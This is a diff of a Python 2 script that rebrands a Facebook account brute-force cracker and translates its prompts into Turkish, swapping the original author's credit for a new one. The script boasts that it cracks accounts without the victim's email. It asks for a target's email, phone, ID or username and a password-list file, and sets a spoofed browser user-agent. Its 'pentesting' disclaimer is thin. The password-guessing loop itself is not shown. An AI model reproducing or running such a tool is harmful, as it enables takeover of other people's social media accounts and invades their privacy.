@@ -14,28 +14,27 @@ import cookielib
 
 GHT = '''
         +=======================================+
-        |..........Facebook Cracker v 2.........|
+        |..........Facebook Bruteforce v 1......|
         +---------------------------------------+
-        |#Author: Mauritania Attacker           |
-        |#Contact: www.fb.com/mauritanie.forever|
-        |#Date: 02/04/2013                      |
+        |#Kodlayan: Samuray                     |
+        |#Site: www.türkiyemsibertim.org        |
+        |#Tarih: 22/04/2020                     |
         |#This tool is made for pentesting.     |
-        |#Changing the Description of this tool |
-        |Won't made you the coder ^_^ !!!       |
-        |#Respect Coderz ^_^                    |
-        |#I take no responsibilities for the    |
-        |  use of this program !                |
+        |#Bu Tool İçin Uğraştım Çalmayın Lütfen |
+        |lütfen Çalmayın ! Emek verdim ^_^ !!!  |
+        |#İllegal İşler İçin Kullanmayın!  ^_^  |
+        |# Hiçbir Sorumluluğu Kabul Etmem       |               
         +=======================================+
-        |..........Facebook Cracker v 2.........|
+        |..........Facebook Bruteforce v 1......|
         +---------------------------------------+
 '''
 print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
-print "# Hit CTRL+C to quit the program"
-print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+print "# Çıkmak İçin CTRL+C "
+print "# Kurbaninizİçin Daha Fazla bilgiyi Burda bUlabilirsiniz www.graph.facebook.com ^_^"
 
 
-email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
-passwordlist = str(raw_input("Enter the name of the password list file : "))
+email = str(raw_input("# Kurbanın Herhangi Bir bilgisi |Email| |Phone number| |Profile ID number| |Username| : "))
+passwordlist = str(raw_input("Passwordun Bulunduğu dizini giriniz : "))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
